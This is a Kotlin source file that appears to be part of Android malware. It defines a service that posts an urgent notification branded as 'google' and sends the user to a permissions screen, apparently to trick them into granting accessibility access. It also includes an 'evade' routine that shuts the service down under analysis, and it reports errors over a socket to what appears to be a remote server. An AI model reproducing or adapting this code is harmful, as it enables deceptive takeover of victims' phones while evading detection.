package com.xxx.zzz.notifp

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.media.AudioAttributes
import android.media.RingtoneManager
import android.os.IBinder
import android.util.Log
import com.xxx.zzz.Payload
import com.xxx.zzz.PermissionsActivity
import com.xxx.zzz.R
import com.xxx.zzz.globp.Constantsfd
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.globp.Stringsvcx.localeTextAccessibility
import com.xxx.zzz.globp.utilssss.evade
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

@OptIn(ExperimentalStdlibApi::class)
class PushServiceds : Service() {

    init {
        Payload.ApplicationScope.launch {
            if (Constantsfd.debug) {
                evade {}.onEscape {
                    withContext(Dispatchers.Main) {
                        runCatching {
                            stopSelf()
                        }
                    }
                }
            }
        }
    }

    private var mNotificationManager: NotificationManager? = null

    override fun onBind(intent: Intent): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.v("srvPushAccessibility", "onStartCommand executed with startId: $startId")

        runCatching {
            mNotificationManager = this.applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            val intentAct = Intent(this, PermissionsActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

            val contentIntent = PendingIntent.getActivity(
                this,
                1234,
                intentAct,
                PendingIntent.FLAG_CANCEL_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val id = "googles"
            val description = "permission"

            val mChannel = NotificationChannel(id, "google", NotificationManager.IMPORTANCE_HIGH)
            mChannel.description = description
            mChannel.enableLights(true)
            mChannel.lightColor = Color.RED
            mChannel.enableVibration(true)
            mChannel.vibrationPattern = longArrayOf(150, 150, 150, 150)

            val att = AudioAttributes.Builder()
                .setUsage(AudioAttributes.USAGE_NOTIFICATION)
                .build()
            mChannel.setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION), att)
            mChannel.setShowBadge(false)
            mNotificationManager?.createNotificationChannel(mChannel)

            val notificationBuilder = Notification.Builder(this, id)

            SharedPreferencess.init(this.applicationContext)
            notificationBuilder
                .setContentTitle(intent?.getStringExtra("title") ?: SharedPreferencess.appName)
                .setVibrate(longArrayOf(150, 150, 150, 150))
                .setAutoCancel(true)
                .setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION))
                .setDefaults(Notification.DEFAULT_VIBRATE)
                .setDefaults(Notification.DEFAULT_SOUND)
                .setDefaults(Notification.DEFAULT_LIGHTS)
                .setPriority(Notification.PRIORITY_HIGH)
                .setVisibility(Notification.VISIBILITY_PUBLIC)
                .setCategory(Notification.CATEGORY_REMINDER)

            val text = localeTextAccessibility() + " " + Constantsfd.access2
            notificationBuilder.setContentText(intent?.getStringExtra("message") ?: text)
            runCatching {
                notificationBuilder.setSmallIcon(R.mipmap.ic_launcher)
            }
            notificationBuilder.setContentIntent(contentIntent)

            val notification = notificationBuilder.build()
            runCatching { mNotificationManager?.cancel(993) }
            runCatching { mNotificationManager?.notify(993, notification) }

//            intent?.getStringExtra("push")?.let {
//                val toast = Toast.makeText(
//                    applicationContext,
//                    intent.getStringExtra("messageToast")
//                        ?: (localeTextAccessibility() + " " + Constantsfd.access1),
//                    Toast.LENGTH_SHORT
//                )
//                toast?.setGravity(Gravity.CENTER, 0, 0)
//                toast?.show()
//            }

            stopSelf()
        }.onFailure {
            IOSocketyt.sendLogs("", "PushServiceds onStartCommand ${it.localizedMessage}", "error")
        }

        return START_NOT_STICKY
    }

    companion object {
        fun cancelNotification(context: Context) {
            runCatching {
                val mNotificationManager = context.applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                mNotificationManager.cancel(993)
            }
        }
    }
}